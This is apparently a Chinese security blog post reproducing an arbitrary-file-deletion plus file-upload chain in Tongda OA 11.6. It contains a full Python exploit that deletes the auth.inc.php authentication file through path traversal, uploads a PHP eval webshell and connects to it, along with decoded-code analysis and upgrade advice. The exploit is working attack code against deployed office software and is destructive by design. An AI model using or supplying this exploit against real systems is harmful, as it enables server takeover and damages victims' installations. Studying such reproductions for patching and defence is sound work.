---
title: 通达OA11.6任意文件删除+文件上传组合GetShell
categories:
  - 漏洞复现
tags:
  - 漏洞
  - 通达OA11.6
  - 漏洞复现
author: Chace
date: 


---

# 通达OA11.6任意文件删除+文件上传组合GetShell



## 漏洞介绍

通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。

通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。

<!--more-->

漏洞利用思路：利用任意文件删除漏洞删除认证文件然后通过文件上传写入一句话木马getshell

注意⚠️：此漏洞会删除认证的文件，然后上传shell，所以该漏洞是会破坏系统认证文件,如果成功利用后会删除程序中的php文件可能会导致程序功能无法使用。

## 影响版本

版本：通达OA 11.6

链接：`https://pan.baidu.com/s/1VqUUNUsgsssK1Mhq2r8HHQ`

提取码：him4

## 漏洞复现

### 环境搭建

靶机环境：win7系统，下载安装包全部默认配置无脑下一步安装



![](1.png)

成功访问网站登录页面如下

![](2.png)

至此确认漏洞环境搭建成功

大佬给出的poc如下：

```python
import requests
target="http://oa.test.com/"
payload="<?php eval($_REQUEST['a']);?>"
print("[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA")
input("Press enter to continue")
print("[*]Deleting auth.inc.php....")

url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
requests.get(url=url)
print("[*]Checking if file deleted...")
url=target+"/inc/auth.inc.php"
page=requests.get(url=url).text
if 'No input file specified.' not in page:
    print("[-]Failed to deleted auth.inc.php")
    exit(-1)
print("[+]Successfully deleted auth.inc.php!")
print("[*]Uploading payload...")
url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
files = {'FILE1': ('hack.php', payload)}
requests.post(url=url,files=files)
url=target+"/_hack.php"
page=requests.get(url=url).text
if 'No input file specified.' not in page:
    print("[+]Filed Uploaded Successfully")
    print("[+]URL:",url)
else:
print("[-]Failed to upload file")
```

### 漏洞分析

我们通过分析POC我们可知，首先通过任意文件删除漏洞删除`/webroot/inc/`目录中的`auth.inc.php`文件，这里利用的是目录`\webroot\module\appbuilder\assets`下`print.php`文件中的一处任意文件删除漏洞，查看代码文件，全是乱码，应该是经过加密处理，使用使用在线解密工具解密

`http://dezend.qiling.org/free.html`

解密后文件如下：

![](3.png)

可以看到，首先对` $s_tmp`进行赋值一个要删除的文件，最后通过`unlink`函数将文件删除，POC通过此漏洞删除了`/webroot/inc/`目录中的`auth.inc.php`文件，根据名字我们可以粗略判断这是一段用于权限校验的代码，我们同样使用解密工具解密`auth.inc.php`文件

![](4.png)

这个文件用于判断用户是否登录，如果未登录的话，就无法上传文件，所以需要将此文件删除，才能成功上传成功。

所以POC的漏洞利用思路如下：

首先对` $s_tmp`进行赋值，这里的`guid`为我们POC中的`../../../webroot/inc/auth.inc.php`文件，最后通过`unlink`函数将登录校验文件`auth.inc.php`删除，然后我们达到成功上传webshell的目的。

### 攻击演示

攻击会删除`auth_inc.php`文件，这里先做个备份。（注意千万不要找公网环境测试，本地自己搭建环境测试）

修改POC中的target为我们的靶机环境，执行脚本

![](5.png)

成功上传webshell文件，使用蚁剑连接

![](6.png)

成功getshell

![](7.png)

## 修复建议

以上漏洞已在官方的最新版本中修复，建议受影响的用户升级至最新版本进行防护，

官方下载链接：

https://www.tongda2000.com/download/p2019.php



## 参考链接

[通达OA11.6漏洞复现](https://mp.weixin.qq.com/s?src=11&timestamp=1597979065&ver=2535&signature=Scl7syktdMYi2FNWo8JUaFzBtLtPAXQOpqrEYohcliaITc-c-vjoz75UBzHUPe9b5-JouKJIFEw9PIW9N**t*PelOu3CRMChwfYWnaIsKKIW4bSc-Kj4RXBz1LFzkHE-&new=1)